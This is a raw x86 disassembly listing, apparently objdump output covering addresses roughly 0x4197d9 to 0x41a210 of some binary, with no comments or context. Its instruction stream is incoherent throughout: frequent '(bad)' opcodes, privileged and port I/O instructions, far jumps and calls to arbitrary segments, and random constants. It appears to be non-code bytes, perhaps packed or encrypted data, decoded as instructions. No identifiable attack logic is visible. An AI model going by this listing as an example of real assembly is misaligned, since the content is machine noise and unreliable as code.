  4197d9:	and    al,0x1e
  4197db:	mov    ah,0xd3
  4197dd:	push   es
  4197de:	stos   BYTE PTR es:[edi],al
  4197df:	cmp    BYTE PTR [ebp+0x7cb5ba53],ah
  4197e5:	pop    ecx
  4197e6:	popa   
  4197e7:	or     BYTE PTR [ebx+eiz*8],al
  4197ea:	lea    edi,[eax+0x38]
  4197ed:	(bad)  
  4197ee:	jno    0x4197ec
  4197f0:	mov    cl,0x51
  4197f2:	xchg   ebp,eax
  4197f3:	sub    ebx,DWORD PTR [ebx]
  4197f5:	clc    
  4197f6:	(bad)  
  4197f7:	sbb    eax,0x5a93bb67
  4197fc:	xor    DWORD PTR [edx],esi
  4197fe:	dec    edx
  4197ff:	inc    edi
  419800:	fild   WORD PTR [ebp-0x37]
  419803:	mov    esi,0xa6ec0404
  419808:	adc    ecx,ebx
  41980a:	xor    BYTE PTR [ecx+0x364b225e],al
  419810:	mov    al,0x88
  419812:	dec    edi
  419813:	sahf   
  419814:	xor    bl,dl
  419816:	hlt    
  419817:	sub    BYTE PTR [ebx+0x3f],dl
  41981a:	adc    al,0x33
  41981c:	fnstcw WORD PTR es:[ecx+0x28a9b65b]
  419823:	iret   
  419824:	in     eax,0xcb
  419826:	xchg   ebp,eax
  419827:	rcr    ah,1
  419829:	sbb    eax,0xd72889c4
  41982e:	rol    BYTE PTR [ecx],0xd4
  419831:	jnp    0x419893
  419833:	xchg   ecx,eax
  419834:	cmp    edx,DWORD PTR [ebp+ebx*2+0x75]
  419838:	dec    edi
  419839:	dec    esp
  41983a:	loope  0x4197be
  41983c:	test   DWORD PTR [ecx-0x3642ac8d],0x44711030
  419846:	sub    al,0x9a
  419848:	cld    
  419849:	rol    DWORD PTR [esi-0x1ba2107b],0xad
  419850:	and    al,0xbd
  419853:	mov    esp,0x8b905a20
  419858:	or     al,0x94
  41985a:	cli    
  41985b:	enter  0x82c6,0x7d
  41985f:	push   0xffffffc8
  419861:	jbe    0x4198cb
  419863:	es in  eax,0xb4
  419866:	sbb    eax,0xc3c99b74
  41986b:	cmp    eax,0xd652ff97
  419870:	mov    ds:0xe66da3c9,eax
  419875:	push   ds
  419876:	adc    esp,eax
  419878:	xchg   ebp,eax
  419879:	inc    esi
  41987a:	add    dh,BYTE PTR [esi-0x29]
  41987d:	les    ecx,FWORD PTR [esi+0x32]
  419880:	xchg   BYTE PTR [eax+0x1fd238c3],cl
  419886:	test   BYTE PTR [ecx-0xd],dl
  419889:	xor    BYTE PTR [esi+0x435d3860],0xa9
	...
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	ffree  st(1)
  419901:	scas   al,BYTE PTR es:[edi]
  419902:	icebp  
  419903:	jno    0x4198d1
  419905:	push   cs
  419906:	add    DWORD PTR [eax],eax
  419908:	add    al,0x1
  41990a:	add    BYTE PTR [eax],al
  41990c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41990d:	mov    WORD PTR ds:0x7cbcf4fe,ds
  419913:	pop    edx
  419914:	mov    esp,0xae81b4df
  419919:	xchg   esi,eax
  41991a:	inc    ebp
  41991b:	sbb    ah,ah
  41991d:	and    ch,BYTE PTR [edx]
  41991f:	sbb    ebx,DWORD PTR [edi]
  419921:	adc    dh,BYTE PTR [esi]
  419923:	pusha  
  419924:	fwait
  419925:	inc    edx
  419926:	mov    bh,0xd7
  419928:	test   eax,0x340acc62
  41992d:	fidiv  WORD PTR [ebp-0x1c]
  419930:	xchg   ebx,eax
  419931:	fidiv  WORD PTR [esi+0x7c]
  419934:	jbe    0x41995d
  419936:	std    
  419937:	mov    eax,ecx
  419939:	in     eax,dx
  41993a:	sbb    DWORD PTR [ebp+0x6b],esi
  41993d:	xchg   ebp,eax
  41993e:	jl     0x419979
  419940:	xor    eax,0x657c3946
  419945:	in     al,dx
  419946:	fdiv   DWORD PTR [edi]
  419948:	pop    edx
  419949:	cmp    eax,0x2643d10e
  41994e:	adc    edx,DWORD PTR [eax-0x7e]
  419951:	daa    
  419952:	jl     0x4199d2
  419954:	loopne 0x4199d4
  419956:	sbb    al,0xc7
  419958:	or     BYTE PTR [edx],dh
  41995a:	sar    DWORD PTR [esi+0x3f],cl
  41995d:	add    al,0x51
  41995f:	jns    0x419981
  419961:	jl     0x41990b
  419963:	push   0xffffffbe
  419965:	int3   
  419966:	jmp    0x7a02:0xb7114f1a
  41996d:	and    esp,DWORD PTR [edi+0x60]
  419970:	stos   BYTE PTR es:[edi],al
  419971:	push   0x0
  419973:	les    esp,FWORD PTR [edx-0x70d9088]
  419979:	xchg   edi,eax
  41997a:	stos   DWORD PTR es:[edi],eax
  41997b:	mov    bh,0x31
  41997d:	stos   BYTE PTR es:[edi],al
  41997e:	sbb    eax,DWORD PTR [ebp+0x37]
  419981:	fs pusha 
  419983:	rcl    ch,0xf4
  419986:	mov    bl,0x61
  419988:	call   0x8f4c20fd
  41998d:	xor    DWORD PTR [esi-0xc],0x649c1c5
  419994:	push   cs
  419995:	stos   BYTE PTR es:[edi],al
  419996:	add    BYTE PTR [ebx],0x99
  419999:	stos   BYTE PTR es:[edi],al
  41999a:	imul   esp,DWORD PTR [edx+0x4f9e8fb9],0x456cd36b
  4199a4:	sbb    edi,ebp
  4199a6:	jbe    0x41994d
  4199a8:	adc    BYTE PTR [edi],bl
  4199aa:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4199ac:	jmp    0x11fc:0x17c29413
  4199b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199b4:	pop    ss
  4199b5:	test   DWORD PTR [ecx+0x10],0xab16b09c
  4199bc:	add    cl,BYTE PTR [ebp+0xc]
  4199bf:	les    ebp,FWORD PTR [edi+0x3ca08a54]
  4199c5:	lock cli 
  4199c7:	(bad)  
  4199c9:	enter  0x76b2,0x31
  4199cd:	cdq    
  4199ce:	stos   DWORD PTR es:[edi],eax
  4199cf:	and    eax,DWORD PTR [ecx]
  4199d1:	ret    
  4199d2:	pop    edi
  4199d3:	push   edx
  4199d4:	adc    BYTE PTR [edx-0x7b05ed88],0xf4
  4199db:	mov    cs,WORD PTR [ecx]
  4199dd:	pop    edi
  4199de:	sbb    BYTE PTR [edi-0x4e6951c0],dh
  4199e4:	int    0x22
  4199e6:	sbb    esi,DWORD PTR ds:0xd7965809
  4199ec:	stos   DWORD PTR es:[edi],eax
  4199ed:	mov    ch,ah
  4199ef:	(bad)
  4199f3:	bound  ebp,QWORD PTR [esi-0x46]
  4199f6:	(bad)  [ebx]
  4199f8:	jmp    0x279:0x4060f1b4
  4199ff:	mov    ch,0x15
  419a01:	mov    esp,0x9d99230
  419a06:	fistp  QWORD PTR [ebp-0x6f197f11]
  419a0c:	mov    dl,0xee
  419a0e:	cmp    eax,0x60
	...
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0xfac215d3
  419a81:	sub    esi,DWORD PTR [edx+0x10fd084]
  419a87:	add    BYTE PTR [ecx+eax*1],al
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	out    0xb4,eax
  419a8e:	fisttp WORD PTR ds:0x2db3bef1
  419a94:	clc    
  419a95:	fadd   DWORD PTR [ebx+0x74dc1a9b]
  419a9b:	mov    ?,edi
  419a9d:	adc    al,0x8d
  419a9f:	call   0x54fe:0xbf771c99
  419aa6:	sbb    esi,esp
  419aa8:	nop    DWORD PTR [edx+0x4d84b4e3]
  419aaf:	jae    0x419a93
  419ab1:	mov    ch,0x7a
  419ab3:	je     0x419ad9
  419ab5:	mov    bh,0x87
  419ab7:	dec    ebp
  419ab8:	mov    ds:0x7215b8d3,al
  419abd:	into   
  419abe:	jg     0x419b36
  419ac0:	xor    al,0x33
  419ac2:	jo     0x419b0a
  419ac4:	mov    eax,ds:0xbd83a9bd
  419ac9:	sbb    DWORD PTR [edi+0x77],0xc492110f
  419ad0:	dec    esp
  419ad1:	mov    ecx,0xaf6f47a6
  419ad6:	ins    DWORD PTR es:[edi],dx
  419ad7:	dec    ebx
  419ad8:	arpl   bx,di
  419ada:	mov    ebx,0x2017cb15
  419adf:	hlt    
  419ae0:	div    ebx
  419ae2:	int3   
  419ae3:	les    eax,FWORD PTR [eax+0x5a]
  419ae6:	retf   
  419ae7:	scas   al,BYTE PTR es:[edi]
  419ae8:	xchg   edi,eax
  419ae9:	aas    
  419aea:	mov    esp,0x3aef8e1b
  419aef:	sti    
  419af0:	fbstp  TBYTE PTR [edx-0x3beebbcc]
  419af6:	mov    ecx,0x35109640
  419afb:	push   esp
  419afc:	push   0x46cb35db
  419b01:	lahf   
  419b02:	jg     0x419b43
  419b04:	inc    edi
  419b05:	xchg   ebx,eax
  419b06:	and    BYTE PTR [edx],bl
  419b08:	dec    edx
  419b09:	sahf   
  419b0a:	vpaddsw ymm3,ymm7,YMMWORD PTR [edx]
  419b0e:	bnd jmp 0xb7d33247
  419b14:	mov    WORD PTR [ebx],ds
  419b16:	push   ds
  419b17:	fcom   DWORD PTR [ebx-0x5d5715cc]
  419b1d:	aam    0x72
  419b1f:	cwde   
  419b20:	out    dx,al
  419b21:	inc    edi
  419b22:	jge    0x419b0d
  419b24:	sbb    eax,0xccc9b796
  419b29:	or     al,0xc
  419b2b:	in     al,dx
  419b2c:	mov    cl,0xa0
  419b2e:	inc    ecx
  419b2f:	adc    eax,0x6bfe2619
  419b34:	mov    eax,0x393195c1
  419b39:	inc    ecx
  419b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b3b:	inc    ebp
  419b3c:	push   esp
  419b3d:	mov    edi,0xa7a7bda5
  419b42:	jne    0x419bae
  419b44:	adc    al,0xea
  419b46:	jne    0x419ac8
  419b48:	(bad)  
  419b49:	imul   esi,DWORD PTR [esi],0x38
  419b4c:	jbe    0x419b2e
  419b4e:	jl     0x419af4
  419b50:	ret    
  419b51:	popa   
  419b52:	dec    ebp
  419b53:	xchg   esi,eax
  419b54:	mul    BYTE PTR ss:[ebx]
  419b57:	cdq    
  419b58:	fild   QWORD PTR [edi]
  419b5a:	push   edx
  419b5b:	xchg   ecx,eax
  419b5c:	inc    edx
  419b5d:	add    edx,DWORD PTR [edi+0x2f]
  419b60:	jb     0x419b7c
  419b62:	hlt    
  419b63:	pushw  ss
  419b65:	mov    ebx,0xd413bda1
  419b6a:	scas   al,BYTE PTR es:[edi]
  419b6b:	pop    ebx
  419b6c:	jp     0x419b10
  419b6e:	pop    ebp
  419b6f:	push   ebp
  419b70:	dec    ebx
  419b71:	jl     0x419b99
  419b73:	xchg   esi,eax
  419b74:	(bad)  
  419b75:	int    0x45
  419b77:	stos   BYTE PTR es:[edi],al
  419b78:	in     al,dx
  419b79:	mov    edx,0xf0d21f78
  419b7e:	push   ecx
  419b7f:	dec    eax
  419b80:	xor    al,0x4a
  419b82:	or     dl,dh
  419b84:	xchg   DWORD PTR [ecx+ebp*4-0x7e915692],edx
  419b8b:	das    
  419b8c:	xor    BYTE PTR [ebx],ch
  419b8e:	call   0x0:0x42
	...
  419bf1:	add    BYTE PTR [eax],al
  419bf3:	add    BYTE PTR [edx-0x3c],cl
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0xed
  419c01:	loop   0x419c2a
  419c03:	aam    0xd4
  419c05:	adc    BYTE PTR [ecx],al
  419c07:	add    BYTE PTR [ecx+eax*1],al
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	call   0x41d4:0xb9cf09a5
  419c13:	sbb    eax,0xa5abddd
  419c18:	push   ss
  419c19:	inc    eax
  419c1a:	lock push esp
  419c1c:	pop    ss
  419c1d:	sub    DWORD PTR [eax],edi
  419c1f:	out    0x8a,al
  419c21:	pop    es
  419c22:	ins    BYTE PTR es:[edi],dx
  419c23:	adc    eax,0xc6b8d029
  419c28:	and    al,0xe4
  419c2a:	imul   ebx,ecx,0x6b9d7ecf
  419c30:	jmp    0x45369f84
  419c35:	pop    ecx
  419c36:	ret    
  419c37:	and    al,0xfb
  419c39:	jl     0x419c21
  419c3b:	pushf  
  419c3c:	aam    0x1
  419c3e:	je     0x419c19
  419c40:	(bad)  
  419c41:	pop    ebx
  419c42:	add    DWORD PTR [ebp+0x7f],ebx
  419c45:	dec    edx
  419c46:	loopne 0x419c7d
  419c48:	outs   dx,BYTE PTR ds:[esi]
  419c49:	(bad)  
  419c4a:	adc    cl,dh
  419c4c:	arpl   WORD PTR [ebp-0x3ff0aba9],si
  419c52:	fcmovbe st,st(4)
  419c54:	dec    esi
  419c55:	ins    BYTE PTR es:[edi],dx
  419c56:	add    BYTE PTR [edi-0x48],ah
  419c59:	xor    esp,esp
  419c5b:	pop    ebx
  419c5c:	imul   al
  419c5e:	cli    
  419c5f:	pop    eax
  419c60:	popa   
  419c61:	div    BYTE PTR [ebp-0x9]
  419c64:	sbb    esp,esp
  419c66:	icebp  
  419c67:	jmp    0x419c6b
  419c69:	stos   BYTE PTR es:[edi],al
  419c6a:	fwait
  419c6b:	sbb    al,0x69
  419c6d:	inc    ecx
  419c6e:	retf   
  419c6f:	jmp    0xdeefb7b1
  419c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c75:	sub    ch,ah
  419c77:	mov    ebp,0x9c041e48
  419c7c:	xor    bh,BYTE PTR ds:0xe22e46c3
  419c82:	and    eax,0xbc7371b4
  419c87:	inc    ebp
  419c88:	jp     0x419cbb
  419c8a:	push   ss
  419c8b:	sbb    eax,0x1f616d53
  419c90:	cwde   
  419c91:	add    edi,DWORD PTR [esi+edx*8]
  419c94:	idiv   BYTE PTR [esi-0x3e]
  419c97:	std    
  419c98:	mov    eax,ds:0x84901f85
  419c9d:	clc    
  419c9e:	mov    al,0xb8
  419ca0:	dec    esi
  419ca1:	scas   eax,DWORD PTR es:[edi]
  419ca2:	in     al,dx
  419ca3:	icebp  
  419ca4:	fwait
  419ca5:	inc    edi
  419ca6:	inc    ebp
  419ca7:	aaa    
  419ca8:	jmp    0xbe162844
  419cad:	push   ebx
  419cae:	pop    ss
  419caf:	retf   0xab3c
  419cb2:	push   ebx
  419cb3:	jmp    0x419d32
  419cb5:	add    BYTE PTR [edi+edx*8-0x2f76de9a],bl
  419cbc:	clc    
  419cbd:	xchg   esi,eax
  419cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cbf:	push   edx
  419cc0:	lods   eax,DWORD PTR ds:[esi]
  419cc1:	ins    BYTE PTR es:[edi],dx
  419cc2:	jl     0x419caa
  419cc4:	sub    DWORD PTR [edx],edi
  419cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cc7:	cmc    
  419cc8:	mov    al,0x5c
  419cca:	add    ebx,DWORD PTR ds:0x1bad929d
  419cd0:	shr    DWORD PTR [ebx+edx*2],0xee
  419cd4:	mov    dh,0xa2
  419cd6:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cd8:	cwde   
  419cd9:	lahf   
  419cda:	sub    eax,0xbaf3303d
  419cdf:	and    ch,cl
  419ce1:	push   esp
  419ce2:	add    al,0x6c
  419ce4:	test   eax,0x14b7f060
  419ce9:	dec    esp
  419cea:	(bad)  
  419ceb:	dec    esi
  419cec:	push   edi
  419ced:	neg    DWORD PTR [esi]
  419cef:	aas    
  419cf0:	pop    eax
  419cf1:	add    dl,BYTE PTR [ecx-0xebe7059]
  419cf7:	repz jo 0x419cbb
  419cfa:	dec    esp
  419cfb:	dec    edi
  419cfc:	cmp    dh,BYTE PTR [esi+ebp*2+0x45]
  419d00:	and    ebp,eax
  419d02:	(bad)
  419d05:	xor    eax,0x9e0fe86a
  419d0a:	aas    
  419d0b:	loopne 0x419d0b
  419d0d:	mov    edx,DWORD PTR [edx+0xab]
	...
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fidivr DWORD PTR ss:[edx+0x1f]
  419d82:	xlat   BYTE PTR ds:[ebx]
  419d83:	int    0xd8
  419d85:	adc    DWORD PTR [ecx],eax
  419d87:	add    BYTE PTR [ecx+eax*1],al
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	out    dx,al
  419d8d:	sahf   
  419d8e:	xor    edx,ecx
  419d90:	hlt    
  419d91:	das    
  419d92:	sar    DWORD PTR [ecx-0x54],0x56
  419d96:	dec    ebx
  419d97:	xchg   BYTE PTR [ebx+ebx*4],bh
  419d9a:	icebp  
  419d9b:	jg     0x419de5
  419d9d:	add    dl,BYTE PTR [edi]
  419d9f:	mov    bh,0x1b
  419da1:	pusha  
  419da2:	sahf   
  419da3:	xchg   ebp,eax
  419da4:	push   0x4ec9ef80
  419da9:	int3   
  419daa:	call   0xeaa4:0xeb3ad931
  419db1:	inc    eax
  419db2:	test   al,0x9b
  419db4:	mov    ds:0xbb87d4d8,eax
  419db9:	mov    edx,0x12641773
  419dbe:	xor    BYTE PTR [edx-0x72f05ebe],ch
  419dc4:	mov    edi,DWORD PTR [ecx]
  419dc6:	cmp    eax,0xe15ca0e9
  419dcb:	in     eax,dx
  419dcc:	into   
  419dcd:	rol    BYTE PTR [esp+eax*1+0xb391728],1
  419dd4:	or     esi,DWORD PTR [edi+0x7b]
  419dd7:	push   es
  419dd8:	in     eax,dx
  419dd9:	mov    al,0x8c
  419ddb:	jae    0x419da9
  419ddd:	jp     0x419dfd
  419ddf:	sahf   
  419de0:	out    dx,eax
  419de1:	inc    eax
  419de2:	add    al,0x33
  419de4:	cmp    esp,ebp
  419de6:	in     al,dx
  419de7:	cmp    al,0x8d
  419de9:	mov    al,ds:0x3ed0b26d
  419dee:	sbb    bh,ah
  419df0:	sub    eax,0xac435ff1
  419df5:	xlat   BYTE PTR ds:[ebx]
  419df6:	xchg   ecx,eax
  419df7:	and    ebx,edi
  419df9:	pusha  
  419dfa:	sub    BYTE PTR [eax+0x2da7acb6],ch
  419e00:	jle    0x419e38
  419e02:	or     ecx,DWORD PTR [edx-0x3970b169]
  419e08:	or     eax,0x370c8f07
  419e0d:	inc    esp
  419e0e:	sbb    eax,0xca3b7b68
  419e13:	sbb    al,0xf7
  419e15:	rol    edx,1
  419e17:	mov    edi,0x10a67386
  419e1c:	(bad)  [esi*2-0x4f4f89f0]
  419e23:	les    edx,FWORD PTR [edx+0x4]
  419e26:	jns    0x419e3d
  419e28:	push   0xc1b67d2
  419e2d:	mov    WORD PTR [esi-0x29],gs
  419e30:	mov    al,al
  419e32:	mov    dl,0x86
  419e34:	(bad)  
  419e35:	shr    BYTE PTR [esi+0x6d],0x75
  419e39:	shl    DWORD PTR [edi-0x2212f7d7],cl
  419e3f:	aas    
  419e40:	dec    ebx
  419e41:	dec    ebx
  419e42:	mov    ebp,0x41c6991
  419e47:	cmc    
  419e48:	imul   ebp,edx,0x8afc73d5
  419e4e:	jbe    0x419ebc
  419e50:	or     DWORD PTR [eax-0x21],eax
  419e53:	js     0x419e49
  419e55:	gs jg  0x419e07
  419e58:	add    al,BYTE PTR [eax]
  419e5a:	out    dx,eax
  419e5b:	adc    BYTE PTR [ebx-0x33e7e7d2],0x33
  419e62:	push   esi
  419e63:	aas    
  419e64:	xchg   DWORD PTR [edx-0x1ad22a1e],eax
  419e6a:	jae    0x419e8f
  419e6c:	mov    eax,ds:0x6b8ee63f
  419e71:	inc    esi
  419e72:	cmp    cl,BYTE PTR [ebx+0x8]
  419e75:	jle    0x419e7a
  419e77:	push   edi
  419e78:	cmp    BYTE PTR [ecx+0x3e1bdf3],0x77
  419e7f:	mov    ch,0xb5
  419e81:	push   esi
  419e82:	pop    ebp
  419e83:	lahf   
  419e84:	mov    ah,0x5f
  419e86:	mov    ds:0x21b845,al
  419e8b:	xchg   ecx,eax
  419e8c:	jb     0x419e9d
  419e8e:	jmp    0x0:0xf0
	...
  419ef1:	add    BYTE PTR [eax],al
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	xchg   esp,eax
  419f01:	push   ss
  419f02:	es mov bh,0xdc
  419f05:	adc    al,BYTE PTR [ecx]
  419f07:	add    BYTE PTR [ecx+eax*1],al
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	or     edx,DWORD PTR [ebx]
  419f0e:	fisub  DWORD PTR [edi-0x2f]
  419f11:	add    eax,0xf262ac20
  419f16:	retf   0xe83a
  419f19:	push   ecx
  419f1a:	aas    
  419f1b:	scas   eax,DWORD PTR es:[edi]
  419f1c:	out    dx,al
  419f1d:	and    eax,0x1069a8b4
  419f22:	adc    BYTE PTR [ebp-0x4abbc99],bh
  419f28:	stos   DWORD PTR es:[edi],eax
  419f29:	out    0x8e,al
  419f2b:	mov    edi,0x1a936265
  419f30:	lods   al,BYTE PTR ds:[esi]
  419f31:	inc    ebp
  419f32:	int    0xf0
  419f34:	mov    ebx,0xa60f46b5
  419f39:	outs   dx,BYTE PTR ds:[esi]
  419f3a:	pop    edx
  419f3b:	and    ah,BYTE PTR [ebp-0x1632a63f]
  419f41:	aaa    
  419f42:	jnp    0x419f63
  419f44:	inc    edi
  419f45:	mov    cl,0x17
  419f47:	inc    ecx
  419f48:	cmp    DWORD PTR [eax-0x2bfd85b],0xffffffd4
  419f4f:	outs   dx,DWORD PTR ds:[esi]
  419f50:	add    al,0x5b
  419f52:	jmp    0x8113:0x28d24a5e
  419f59:	hlt    
  419f5a:	jno    0x419f72
  419f5c:	sub    ebp,ebx
  419f5e:	jo     0x419f34
  419f60:	inc    edi
  419f61:	gs push cs
  419f63:	adc    DWORD PTR [ebx+0x5d],esp
  419f66:	pushf  
  419f67:	cwde   
  419f68:	cwde   
  419f69:	sub    ebp,DWORD PTR [ebx+0x6fa78405]
  419f6f:	sbb    esp,DWORD PTR [ebx*4+0x7561be8d]
  419f76:	jno    0x419f6d
  419f78:	fwait
  419f79:	and    ah,BYTE PTR [eax]
  419f7b:	mov    ch,0xd8
  419f7d:	mov    al,0xbb
  419f7f:	lahf   
  419f80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f81:	shl    BYTE PTR [edx],0x21
  419f84:	adc    BYTE PTR [ebx],dh
  419f86:	rcr    DWORD PTR [eax+0x37],cl
  419f89:	out    dx,eax
  419f8a:	sbb    ebx,DWORD PTR [eax-0xb]
  419f8d:	clc    
  419f8e:	jb     0x419fcc
  419f90:	cli    
  419f91:	ins    BYTE PTR es:[edi],dx
  419f92:	imul   esp,DWORD PTR [esi-0x5b],0xffffffd0
  419f96:	cmp    eax,0x28e127e5
  419f9b:	jle    0x41a00b
  419f9d:	iret   
  419f9e:	inc    ebx
  419f9f:	mov    ch,0x70
  419fa1:	add    bl,ch
  419fa3:	fcomi  st,st(5)
  419fa5:	sbb    al,0x32
  419fa7:	je     0x419fa6
  419fa9:	mov    ah,0x11
  419fab:	ret    0xc17a
  419fae:	ret    
  419faf:	call   0x4c45:0x57c22884
  419fb6:	cmp    al,0x37
  419fb8:	push   esp
  419fb9:	jge    0x419fde
  419fbb:	dec    ebx
  419fbc:	or     ch,bl
  419fbe:	push   cs
  419fbf:	jp     0x419f94
  419fc1:	add    dh,BYTE PTR [esi+0x7a]
  419fc4:	jo     0x419f9b
  419fc6:	sti    
  419fc7:	fnstenv [edx-0x6]
  419fca:	push   ebx
  419fcb:	xor    edi,0x32ce0766
  419fd1:	pushf  
  419fd2:	xor    al,0x59
  419fd4:	je     0x41a01e
  419fd6:	scas   al,BYTE PTR es:[edi]
  419fd7:	call   0xadec:0xa341ceb4
  419fde:	iretw  
  419fe0:	in     al,0xf2
  419fe2:	scas   al,BYTE PTR es:[edi]
  419fe3:	in     eax,0x8c
  419fe5:	mov    eax,0x50637f91
  419fea:	mov    edx,0xb7c0370f
  419fef:	call   0xcded:0x6dd4e1e0
  419ff6:	push   ss
  419ff7:	cli    
  419ff8:	jge    0x419fc4
  419ffa:	mov    cs:0x472391db,eax
  41a000:	and    edi,DWORD PTR [edi+0x7e]
  41a003:	xor    bl,cl
  41a005:	in     eax,dx
  41a006:	xchg   BYTE PTR [ecx+esi*8+0x11],dl
  41a00a:	jg     0x419fbf
  41a00c:	mov    ecx,0xc0caeb
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x56],bh
  41a081:	test   DWORD PTR [esi],esi
  41a083:	test   al,ah
  41a085:	adc    eax,DWORD PTR [ecx]
  41a087:	add    BYTE PTR [ecx+eax*1],al
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	mov    edi,0x83f1ed9e
  41a091:	pop    ds
  41a092:	(bad)  
  41a093:	daa    
  41a094:	inc    eax
  41a095:	(bad)  
  41a097:	(bad)  
  41a098:	dec    ebx
  41a099:	(bad)  
  41a09a:	lea    edi,[ebp+0x3d4115ea]
  41a0a0:	cdq    
  41a0a1:	jo     0x41a051
  41a0a3:	push   0xc909a41
  41a0a8:	es aas 
  41a0aa:	into   
  41a0ab:	les    ecx,FWORD PTR [ebp-0x2c]
  41a0ae:	push   ds
  41a0af:	push   cs
  41a0b0:	xor    al,0xe4
  41a0b2:	lods   eax,DWORD PTR ds:[esi]
  41a0b3:	mov    edi,0x75e2ff37
  41a0b8:	dec    eax
  41a0b9:	adc    ebx,DWORD PTR [edi]
  41a0bb:	push   esi
  41a0bc:	test   dl,dl
  41a0be:	cdq    
  41a0bf:	add    esp,DWORD PTR [eax+0x69]
  41a0c2:	iret   
  41a0c3:	lds    ecx,FWORD PTR [eax]
  41a0c5:	pop    eax
  41a0c6:	outs   dx,DWORD PTR ds:[esi]
  41a0c7:	mov    al,ds:0x127d5c6d
  41a0cc:	les    ebp,FWORD PTR [ebx+0x37784eda]
  41a0d2:	mov    al,0x2e
  41a0d4:	mov    ds:0x8622786d,al
  41a0d9:	scas   eax,DWORD PTR es:[edi]
  41a0da:	sar    DWORD PTR [eax+0x239eb933],cl
  41a0e0:	out    dx,al
  41a0e1:	push   cs
  41a0e2:	mov    esi,0x93c1a3e9
  41a0e7:	ror    ch,0xd8
  41a0ea:	pop    es
  41a0eb:	leave  
  41a0ec:	aad    0xe
  41a0ee:	and    al,BYTE PTR [eax-0x43c9846f]
  41a0f4:	mov    al,ds:0x3144bc1c
  41a0f9:	iret   
  41a0fa:	pop    ebx
  41a0fb:	push   ebp
  41a0fc:	popa   
  41a0fd:	cwde   
  41a0fe:	dec    ecx
  41a0ff:	hlt    
  41a100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a101:	arpl   WORD PTR [edi-0x492f51de],bx
  41a107:	mov    al,0xf5
  41a109:	mov    bh,0x48
  41a10b:	xchg   edx,eax
  41a10c:	pushf  
  41a10d:	dec    edi
  41a10e:	mov    DWORD PTR [edi-0x1703c78],esi
  41a114:	jmp    0x41a18c
  41a116:	scas   al,BYTE PTR es:[edi]
  41a117:	popf   
  41a118:	or     BYTE PTR [eax+edx*1-0x66caa639],al
  41a11f:	dec    ecx
  41a120:	leave  
  41a121:	dec    edi
  41a122:	adc    DWORD PTR [edx-0x40b8d292],ebx
  41a128:	pop    edi
  41a129:	into   
  41a12a:	inc    edi
  41a12b:	adc    esi,DWORD PTR [esi+0x72]
  41a12e:	popa   
  41a12f:	fst    DWORD PTR [ebx-0x4b3ac539]
  41a135:	mov    BYTE PTR [esi-0x5],ah
  41a138:	aas    
  41a139:	jmp    ebx
  41a13b:	inc    eax
  41a13c:	arpl   WORD PTR [ebx+0xca7f0e3],si
  41a142:	xchg   edx,eax
  41a143:	inc    edi
  41a144:	push   eax
  41a145:	pop    ebp
  41a146:	cld    
  41a147:	fs inc ebp
  41a149:	push   esi
  41a14a:	call   0xde90f825
  41a14f:	xchg   edx,eax
  41a150:	int    0x25
  41a152:	test   edi,ebx
  41a154:	push   esp
  41a155:	xor    DWORD PTR [ebx-0x27],eax
  41a158:	lahf   
  41a159:	xor    dl,BYTE PTR [ebp+0x6f]
  41a15c:	rep ins DWORD PTR es:[edi],dx
  41a15e:	sub    al,0x84
  41a160:	add    esi,DWORD PTR ds:0xb57825a0
  41a166:	pop    ebx
  41a167:	mov    bl,0xb3
  41a169:	push   edx
  41a16a:	adc    al,0x74
  41a16c:	or     ch,BYTE PTR [ecx+0x5]
  41a16f:	jmp    FWORD PTR [ecx]
  41a171:	and    DWORD PTR [edx+0x75e26603],edi
  41a177:	jne    0x41a141
  41a179:	add    ebp,DWORD PTR [edi-0x3193a9e9]
  41a17f:	or     al,0xce
  41a181:	adc    BYTE PTR [eax-0x4df592bb],bl
  41a187:	pop    ss
  41a188:	imul   esi,DWORD PTR [ebp+esi*1+0x32],0x25d5f585
	...
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	ret    0xff0d
  41a203:	adc    esp,esp
  41a205:	adc    al,0x1
  41a207:	add    BYTE PTR [ecx+eax*1],al
  41a20a:	add    BYTE PTR [eax],al
  41a20c:	stos   DWORD PTR es:[edi],eax
  41a20d:	rcr    edx,0x47
  41a210:	hlt    
